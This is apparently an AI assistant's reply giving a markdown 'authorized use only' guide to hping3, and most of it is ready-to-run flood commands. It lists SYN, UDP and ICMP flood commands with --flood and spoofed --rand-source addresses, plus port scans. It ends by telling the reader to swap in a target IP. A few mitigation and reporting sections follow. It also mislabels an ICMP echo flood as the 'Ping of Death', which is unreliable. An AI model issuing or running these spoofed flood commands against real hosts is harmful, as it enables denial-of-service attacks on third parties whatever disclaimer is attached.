Here’s a **comprehensive `.md` guide** for `hping3`, covering syntax, use cases, and practical examples for authorized penetration testing:

---

```markdown
# `hping3` Penetration Testing Guide  
*(Authorized Use Only)*  

## **1. Introduction**  
`hping3` is a network tool for crafting custom TCP/IP packets, useful for:  
- **Firewall Testing**  
- **Port Scanning**  
- **DoS/DDoS Simulation** (SYN/UDP/ICMP floods)  
- **Network Traffic Analysis**  

---

## **2. Basic Syntax**  
```bash
hping3 [OPTIONS] TARGET_IP
```
| **Option**  | **Description**                  | **Example**                     |
|-------------|----------------------------------|---------------------------------|
| `-S`        | SYN flag (TCP half-open)         | `hping3 -S 192.168.0.118 -p 80`|
| `-p PORT`   | Target port                      | `-p 443`                        |
| `--flood`   | Send packets as fast as possible | `--flood`                       |
| `--rand-source` | Spoof source IP (randomized) | `--rand-source`              |
| `-1`        | ICMP mode                        | `hping3 -1 192.168.0.118`       |
| `-2`        | UDP mode                         | `hping3 -2 192.168.0.118 -p 53` |

---

## **3. Common Use Cases**  

### **A. SYN Flood (TCP DoS)**  
**Command**:  
```bash
hping3 -S 192.168.0.118 -p 80 --flood
```  
**With Spoofed IPs**:  
```bash
hping3 -S 192.168.0.118 -p 80 --flood --rand-source
```  
**Purpose**:  
- Overwrites TCP connection queue.  
- Simulates a SYN flood attack.  

---

### **B. UDP Flood**  
**Command**:  
```bash
hping3 -2 192.168.0.118 -p 53 --flood
```  
**With Spoofed IPs**:  
```bash
hping3 -2 192.168.0.118 -p 53 --flood --rand-source
```  
**Purpose**:  
- Floods UDP ports (e.g., DNS on port 53).  
- Bypasses connection-based defenses.  

---

### **C. ICMP Flood (Ping of Death)**  
**Command**:  
```bash
hping3 -1 192.168.0.118 --flood
```  
**With Spoofed IPs**:  
```bash
hping3 -1 192.168.0.118 --flood --rand-source
```  
**Purpose**:  
- Overloads target with ICMP Echo Requests.  
- Tests ICMP rate-limiting.  

---

## **4. Advanced Options**  

### **A. Packet Customization**  
| **Option**  | **Description**                  | **Example**                     |
|-------------|----------------------------------|---------------------------------|
| `-d SIZE`   | Packet size (bytes)              | `-d 1000`                       |
| `-c COUNT`  | Number of packets to send        | `-c 1000`                       |
| `-w WIN`    | TCP window size                  | `-w 64`                         |
| `-t TTL`    | Time-to-Live                     | `-t 128`                        |

**Example**:  
```bash
hping3 -S 192.168.0.118 -p 80 -d 1200 -c 5000
```

---

### **B. Port Scanning**  
**Stealth Scan**:  
```bash
hping3 -S 192.168.0.118 -p ++1
```  
- Scans ports sequentially (e.g., 1, 2, 3...).  

**Range Scan**:  
```bash
hping3 -S 192.168.0.118 -p 80-100
```  

---

## **5. Monitoring & Analysis**  

### **On Attacker Side**  
```bash
tcpdump -i eth0 'host 192.168.0.118' -w hping3_capture.pcap
```  
- Captures traffic for analysis in Wireshark.  

### **On Target Side**  
```bash
netstat -tuln | grep "80"  # Check active connections
htop                       # Monitor CPU/RAM
```

---

## **6. Mitigation Testing**  
Test defenses against `hping3` attacks:  
- **SYN Cookies**:  
  ```bash
  sysctl -w net.ipv4.tcp_syncookies=1
  ```  
- **Rate Limiting**:  
  ```bash
  iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
  ```  

---

## **7. Legal & Reporting**  
### **Sample Report**  
```markdown
# hping3 Test Report  
**Target**: `192.168.0.118`  
**Test Type**: SYN Flood (`-S --flood`)  
**Impact**:  
- 10,000 PPS caused 90% CPU usage.  
- Mitigation: Enabled SYN cookies (100% recovery).  
```

---

## **8. Post-Test Actions**  
1. **Stop Attacks**: `Ctrl+C` in terminal.  
2. **Verify Restoration**:  
   ```bash
   ping 192.168.0.118  # Check if target responds
   ```  
3. **Document Findings**: Share with stakeholders.  

---

⚠️ **Warning**: Always obtain **explicit authorization** before testing.  
```

---

### **How to Use This Guide**  
1. Save as `hping3_guide.md`.  
2. Replace `192.168.0.118` with your target IP.  
3. Use in controlled environments only.  
